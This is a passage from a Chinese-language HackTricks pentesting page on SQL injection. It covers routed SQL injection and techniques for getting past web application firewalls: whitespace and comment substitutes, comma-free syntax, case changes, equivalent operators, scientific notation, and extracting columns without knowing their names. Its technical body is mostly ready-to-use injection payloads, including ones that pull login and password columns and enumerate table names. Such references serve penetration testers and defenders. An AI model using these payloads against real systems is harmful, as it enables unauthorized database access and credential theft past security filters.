'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&amp;"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&amp;&amp;")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
</code></pre>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。 该大会 <strong>旨在促进技术知识</strong>，是各个学科的技术和网络安全专业人士的热烈交流平台。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="routed-sql-injection"><a class="header" href="#routed-sql-injection">Routed SQL injection</a></h2>
<p>Routed SQL injection 是一种情况，其中可注入查询不是产生输出的查询，而是可注入查询的输出传递给产生输出的查询。 (<a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">来自论文</a>)</p>
<p>示例：</p>
<pre><code>#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
</code></pre>
<h2 id="waf-绕过"><a class="header" href="#waf-绕过">WAF 绕过</a></h2>
<p><a href="https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass">初始绕过来自这里</a></p>
<h3 id="无空格绕过"><a class="header" href="#无空格绕过">无空格绕过</a></h3>
<p>无空格 (%20) - 使用空白替代品绕过</p>
<pre><code class="language-sql">?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
</code></pre>
<p>无空格 - 使用注释绕过</p>
<pre><code class="language-sql">?id=1/*comment*/and/**/1=1/**/--
</code></pre>
<p>无空格 - 使用括号绕过</p>
<pre><code class="language-sql">?id=(1)and(1)=(1)--
</code></pre>
<h3 id="无逗号绕过"><a class="header" href="#无逗号绕过">无逗号绕过</a></h3>
<p>无逗号 - 使用 OFFSET、FROM 和 JOIN 绕过</p>
<pre><code>LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
</code></pre>
<h3 id="通用绕过"><a class="header" href="#通用绕过">通用绕过</a></h3>
<p>使用关键字的黑名单 - 使用大写/小写绕过</p>
<pre><code class="language-sql">?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
</code></pre>
<p>使用关键字的黑名单不区分大小写 - 使用等效运算符绕过</p>
<pre><code>AND   -&gt; &amp;&amp; -&gt; %26%26
OR    -&gt; || -&gt; %7C%7C
=     -&gt; LIKE,REGEXP,RLIKE, not &lt; and not &gt;
&gt; X   -&gt; not between 0 and X
WHERE -&gt; HAVING --&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))
</code></pre>
<h3 id="科学计数法-waf-绕过"><a class="header" href="#科学计数法-waf-绕过">科学计数法 WAF 绕过</a></h3>
<p>您可以在 <a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">gosecure blog</a> 中找到对此技巧的更深入解释。<br />
基本上，您可以以意想不到的方式使用科学计数法来绕过 WAF：</p>
<pre><code>-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
</code></pre>
<h3 id="绕过列名限制"><a class="header" href="#绕过列名限制">绕过列名限制</a></h3>
<p>首先，请注意，如果<strong>原始查询和您想要提取标志的表具有相同数量的列</strong>，您可以直接执行：<code>0 UNION SELECT * FROM flag</code></p>
<p>可以<strong>在不使用列名的情况下访问表的第三列</strong>，使用如下查询：<code>SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</code>，因此在sqlinjection中，这看起来像：</p>
<pre><code class="language-bash"># This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
</code></pre>
<p>或使用 <strong>comma bypass</strong>：</p>
<pre><code class="language-bash"># In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
</code></pre>
<p>这个技巧来自于 <a href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/">https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/</a></p>
<h3 id="waf-绕过建议工具"><a class="header" href="#waf-绕过建议工具">WAF 绕过建议工具</a></h3>
<p>{% embed url="https://github.com/m4ll0k/Atlas" %}</p>
<h2 id="其他指南"><a class="header" href="#其他指南">其他指南</a></h2>
<ul>
<li><a href="https://sqlwiki.netspi.com">https://sqlwiki.netspi.com/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
</ul>
<h2 id="暴力破解检测列表"><a class="header" href="#暴力破解检测列表">暴力破解检测列表</a></h2>
<p>{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}</p>
<p>​</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。这个大会 <strong>旨在促进技术知识</strong>，是各个学科技术和网络安全专业人士的一个热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/sql-injection/ms-access-sql-injection.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/sql-injection/ms-access-sql-injection.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
